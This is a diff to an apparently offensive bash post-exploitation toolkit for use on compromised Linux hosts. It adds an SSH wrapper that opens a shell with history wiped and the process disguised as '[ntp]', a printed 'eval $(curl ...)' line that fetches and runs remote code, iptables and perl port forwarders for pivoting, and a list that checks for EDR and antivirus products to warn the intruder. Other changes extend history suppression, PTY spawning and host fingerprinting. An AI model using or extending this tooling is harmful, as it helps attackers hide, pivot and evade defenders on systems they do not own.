@@ -204,7 +204,7 @@ ssh-known-hosts2hashcat() {
 xssh() {
     local ttyp="$(stty -g)"
     local opts=()
-    [ -z "$NOMX" ] && {
+    [ -z "$NOMX" ] && [ -n "$XHOME" ] && {
         [ ! -d "$XHOME" ] && hs_mkxhome
         [ -d "$XHOME" ] && {
             HS_INFO "Multiplexing all SSH connections over a single TCP. ${CF}[set NOMX=1 to disable]"
@@ -213,11 +213,11 @@ xssh() {
     }
     # If we use key then disable Password auth ('-oPasswordAuthentication=no' is not portable)
     { [[ "$*" == *" -i"* ]] || [[ "$*" == "-i"* ]]; } && opts+=("-oBatchMode=yes")
-    echo -e "May need to cut & paste: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CN}'"
+    [ -n "$HS_URL" ] && echo -e "May need to cut & paste: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CN}'"
     stty raw -echo icrnl opost
     \ssh "${HS_SSH_OPT[@]}" "${opts[@]}" -T \
         "$@" \
-        "unset SSH_CLIENT SSH_CONNECTION; LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [ntp] script -qc 'source <(resize 2>/dev/null); exec -a [uid] bash -i' /dev/null"
+        'unset SSH_CLIENT SSH_CONNECTION; command -v script >/dev/null && c=("script" "-qc" "exec -a [uid] /bin/bash -i" "/dev/null"); [ -z "$c" ] && command -v python >/dev/null && c=("python" "-c" "import pty; pty.spawn(\"/bin/bash\")"); [ -z "$c" ] && perl -e "use Expect" 2>/dev/null && { c=("perl" "-e" "use Expect; my \$exp = Expect->new; \$exp->raw_pty(1); \$exp->spawn(\"/bin/bash\"); \$exp->interact;");echo "May need: stty sane";}; [ -z "$c" ] && c=("bash" "-i"); LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color BASH_HISTORY=/dev/null HISTFILE=/dev/null exec -a "[ntp]" "${c[@]}"'
     [ -n "$ttyp" ] && stty "${ttyp}"
 }
 
@@ -440,9 +440,17 @@ command -v srm >/dev/null || srm() { shred "$@"; }
 command -v strings >/dev/null || { command -v perl >/dev/null && strings() { LC_ALL=C perl -nle 'print $& while m/[[:print:]]{8,}/g' "$@"; }; }
 command -v strings >/dev/null || { command -v grep >/dev/null && strings() { grep -a -o -E '[[:print:]]{8,}' "$@"; }; }
 
+_hs_ipt_once() {
+    local table="${1:?}"
+    local cmd="${2:?}"
+    shift 1
+    shift 1
+    iptables -t "${table}" -C "$@" >/dev/null 2>/dev/null && return
+    iptables -t "${table}" "${cmd}" "$@"
+}
 _hs_bounceinit_add() {
     local src="${1:?}"
-    iptables -t mangle -A PREROUTING -s "${src}" -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
+    _hs_ipt_once mangle -A PREROUTING -s "${src}" -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
 }
 
 _hs_bounceinit() {
@@ -526,6 +534,18 @@ bounce() {
     iptables -t nat -A PREROUTING -p "${proto}" --dport "${fport:?}" -m mark --mark 1188 -j DNAT --to "${dstip:?}:${dstport:?}" || return
     HS_INFO "Traffic to _this_ host's ${CDY}${proto}:${fport}${CDM} is now forwarded to ${CDY}${dstip}:${dstport}"
     _hs_bounces_show
+}
+
+
+# A simple perl port forwarder that does not require root and can be used in userland.
+bounceperl(){
+    _hs_dep perl || return
+    [ $# -lt 3 ] && {
+        echo >&2 "bounceperl <local-port> <destination-ip> <destination-port>"
+        return 255
+    }
+    _X='use IO::Socket::INET;use IO::Select;($l,$h,$p)=@ENV{qw/SPORT DIP DPORT/};$p&&$h&&$l or die"set SPORT DIP DPORT\n";$ls=IO::Socket::INET->new(LocalPort=>$l,Listen=>5,Reuse=>1,Proto=>"tcp")||die$!;while($c=$ls->accept){$r=IO::Socket::INET->new(PeerHost=>$h,PeerPort=>$p,Proto=>"tcp")||do{close$c;next};$c->autoflush(1);$r->autoflush(1);$s=IO::Select->new($c,$r);while($s->count){for $x($s->can_read){$n=sysread($x,$b,8192);if(!$n){$s->remove($x);close$x;next}$t=$x==$c?$r:$c;syswrite($t,$b)}}}' \
+    SPORT="$1" DIP="$2" DPORT="$3" LANG=C perl -e 'eval $ENV{_X}'
 }
 
 sub() {
@@ -1251,6 +1271,7 @@ _warn_edr() {
     _hs_chk_fn "/opt/COMODO"                                "Comodo AV"
     _hs_chk_fn "/opt/CrowdStrike"                           "CrowdShite"
     _hs_chk_fn "/opt/cyberark"                              "CyberArk"
+    _hs_chk_fn "/var/run/drweb-configd.pid"                 "Dr.Web"
     _hs_chk_fn "/opt/360sdforcnos"                          "EDR ?"
     _hs_chk_fn "/etc/filebeat"                              "Filebeat (not AV/EDR, but used to ship logs)"
     _hs_chk_fn "/opt/fireeye"                               "FireEye/Trellix EDR"
@@ -1314,7 +1335,7 @@ _warn_edr() {
     _hs_chk_systemd "itsm"                              "Comodo Client Security"
     _hs_chk_systemd "cloudmonitor"                      "Argus Cloud Agent"
     _hs_chk_systemd "falcon-sensor"                     "CrowdStrike"
-    _hs_chk_systemd "epmd"                              "CyberArk"
+    # _hs_chk_systemd "epmd"                              "CyberArk" # epmd is Erlang Port Mapper Daemon. It is used by many products, including RabbitMQ. Not specific enough to be a good indicator.
     _hs_chk_systemd "cybereason-sensor"                 "Cybereason"
     _hs_chk_systemd "elastic-agent"                     "Elastic Security"
     _hs_chk_systemd "sraagent"                          "ESET Endpoint Security"
@@ -1499,7 +1520,7 @@ _ebsock() {
 
     _HS_EBSOCK=$(grep -Eom1 '@(event-[a-zA-Z0-9]{10}|/dev/(event|stats)-[a-zA-Z0-9]{10}|UDEV-[a-zA-Z0-9]{8}|/run/systemd/log|/proc/udevd)' /proc/net/unix 2>/dev/null)
     # /tmp/dbus-[a-zA-Z0-9]{10} can occur naturally so check that it's just 1.
-    [ -z "$_HS_EBSOCK" ] && _HS_EBSOCK=$(grep -E '@/tmp/dbus-[a-zA-Z0-9]{10}' /proc/net/unix | sed 's|.*@||g'  | sort | uniq -c | grep " 1 " | awk '{print $2}' | head -n1)
+    [ -z "$_HS_EBSOCK" ] && _HS_EBSOCK=$(grep -E '@/tmp/dbus-[a-zA-Z0-9]{10}' /proc/net/unix 2>/dev/null | sed 's|.*@||g'  | sort | uniq -c | grep " 1 " | awk '{print $2}' | head -n1)
     [ -z "$_HS_EBSOCK" ] && {
         _HS_EBSOCK="NA"
         return
@@ -2190,6 +2211,9 @@ _hs_mk_pty() {
         "${HS_PY:-python}" -c "import pty; pty.spawn(['${SHELL:-sh}', '-c' , 'true'])" 2>/dev/null && exec "${HS_PY:-python}" -c "import pty; pty.spawn('${SHELL:-sh}')"
     elif command -v script >/dev/null; then
         script -qc "${SHELL:-sh} -c true" /dev/null && exec script -qc "${SHELL:-sh}" /dev/null
+    elif perl -e 'use Expect' 2>/dev/null; then
+        echo -e ">>> May need ${CDC}stty sane${CN} if the terminal is messed up after this."
+        exec perl -e 'use Expect; my $exp = Expect->new; $exp->raw_pty(1); $exp->spawn("/bin/bash"); $exp->interact;'
     fi
 
     HS_ERR "Not found: python or script"
@@ -2501,6 +2525,16 @@ xnetstat() {
     return 255
 }
 
+xid() {
+    local mac uuid id ips
+    
+    command -v ip >/dev/null && mac=$(ip l sh|grep -m1 'ff:ff'|awk '{print $2;}')
+    command -v dmidecode >/dev/null && uuid=$(dmidecode -t 1 | grep -m1 UUID | awk '{print $2;}')
+    command -v hostnamectl >/dev/null && id=$(hostnamectl  | grep -m1 Machine|awk '{print $3;}')
+    ips=$(ip -4 -o addr show up scope global | awk '{split($4,a,"/"); print a[1]}' | paste -sd' ')
+    echo -e "MAC:${CDY}${mac:-NA}${CN} UUID:${CDG}${uuid:-NA}${CN} ID:${CDM}${id:-NA}${CN} IPS:${CW}${ips:-NA}${CN}"
+}
+
 hs_init_alias_reinit() {
     which curl &>/dev/null && curl --help 2>/dev/null | grep -iqm1 proto-default && alias curl="HOME=/dev/null curl --proto-default https"
     # stop curl from creating ~/.pkt/nssdb
@@ -2566,14 +2600,26 @@ hs_init_shell() {
     # Some old bash log to default location if HISTFILE is not set. Force to /dev/null
     export HISTFILE="/dev/null"
     export BASH_HISTORY="/dev/null"
-    #history -c 2>/dev/null
-    export LANG=en_US.UTF-8
-    locale -a 2>/dev/null|grep -Fqim1 en_US.UTF || export LANG=en_US
+    #history -c 2>/dev/
+    local str lang
+    str="$(locale -a 2>/dev/null)"
+    # Prefer en_US UTF-8 locale; accept UTF-8/utf-8/UTF8/utf8 variants.
+    if lang="$(printf '%s\n' "$str" | grep -Eim1 '^en_US[._-]?utf-?8$')"; then
+        LANG="$lang"
+    elif lang="$(printf '%s\n' "$str" | grep -Eim1 '^C[._-]?utf-?8$')"; then
+        LANG="$lang"
+    elif printf '%s\n' "$str" | grep -Eq '^en_US$'; then
+        LANG=en_US
+    else
+        LANG=C
+    fi
+    export LANG
     export LESSHISTFILE=-
     export REDISCLI_HISTFILE=/dev/null
     export MYSQL_HISTFILE=/dev/null
     export PSQL_HISTORY=/dev/null
     export SQLITE_HISTORY=/dev/null
+    export MONGODB_LOG_ALL=off
 
     export T=.$'\t''~?$?'".${UID}"
     # PTY backdoor to not sniff when using sudo/su.
